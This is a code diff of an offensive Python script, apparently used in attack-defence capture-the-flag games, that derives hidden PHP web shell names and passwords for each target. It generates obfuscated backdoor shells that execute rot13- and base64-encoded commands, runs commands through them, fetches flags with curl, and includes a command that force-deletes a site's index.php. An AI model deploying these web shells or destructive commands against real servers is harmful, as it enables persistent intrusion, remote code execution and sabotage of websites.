@@ -94,11 +94,15 @@ def random_ua():
     length = len(user_agents)
     rand = randint(0,length-1)
     return user_agents[rand].strip("\n")
-    
+
+def shell_hash(target,target_port):
+    shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
+    shell_arg = hashlib.md5(shell_salt_2 + target + ":" + target_port).hexdigest()
+    return shell_name,shell_arg
+
 def execute_shell(target,target_port,cmd):
+    shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1 or shell_type==2:
-	shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
-	shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
 	c_1 = "system"
 	c_2 = cmd + ";"
 	c_1 = rot13(base64.b64encode(c_1))
@@ -115,8 +119,7 @@ def execute_shell(target,target_port,cmd):
 	return res
 
 def check_shell(target,target_port,cmd):
-    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
-    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
+    shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1:
 	res = execute_shell(target,target_port,"echo hell0W0r1d")
 	if "hell0W0r1d" in res:
@@ -131,11 +134,20 @@ def check_shell(target,target_port,cmd):
     return True
 
 def visit_shell(target,target_port,cmd):
-    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
-    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
+    shell_name,shell_arg = shell_hash(target,target_port)
     if headers.has_key('Content-Length'):
 	del(headers['Content-Length'])
     res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=timeout,headers=headers)
+    if res.status_code==200:
+	res.close()
+	return True
+    res.close()
+    return False
+
+def visit_url(target,target_port,url):
+    if headers.has_key('Content-Length'):
+	del(headers['Content-Length'])
+    res = requests.get("http://" + target + ":" + str(target_port) + url,timeout=timeout,headers=headers)
     if res.status_code==200:
 	res.close()
 	return True
@@ -156,8 +168,7 @@ def upload_and_execute(target,target_port,cmd):
     return cmd
 
 def generate_shell(target,target_port,cmd):
-    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
-    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
+    shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1: 
 	shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
     if shell_type==2:
@@ -172,7 +183,6 @@ def generate_shell(target,target_port,cmd):
         usleep(5);
 	}}
 	?>"""%(shell_name,shell_arg)
-	visit_shell(target,target_port,'')
     return shell_name,shell,base64.b64encode(shell)
 
 def get_shell(target,target_port,cmd):
@@ -184,6 +194,9 @@ def get_flag(target,target_port,cmd):
 
 def get_flag_2(target,target_port,cmd):
     return "/usr/bin/curl " + get_flag_url
+
+def test_vul(target,target_port,cmd):
+    return "/bin/echo hell0W0r1d"
 
 def rm_file_index(target,target_port,cmd):
     return "/bin/rm " + " -rf /var/www/html/index.php"
